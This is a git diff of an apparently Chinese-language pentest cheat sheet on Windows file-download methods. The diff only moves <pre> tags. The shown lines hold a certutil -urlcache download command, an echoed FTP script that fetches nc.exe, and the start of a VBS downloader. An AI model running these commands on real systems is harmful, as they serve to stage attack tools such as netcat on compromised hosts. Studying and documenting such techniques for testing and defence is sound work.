@@ -41,15 +41,15 @@ downloader常用方法如下：
  3. certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt file.txt
 
  ftp:
- <pre>
+    <pre>
     echo USER offs >>  ftp.txt
     echo lab >> ftp.txt
     echo bin >> ftp.txt
     echo GET nc.exe >> ftp.txt
     echo bye >> ftp.txt
-
+    </pre>
     ftp -v -n -s:ftp.txt
-</pre>
+
 vbs:
     <pre>
     echo strUrl = WScript.Arguments.Item(0) > wget.vbs
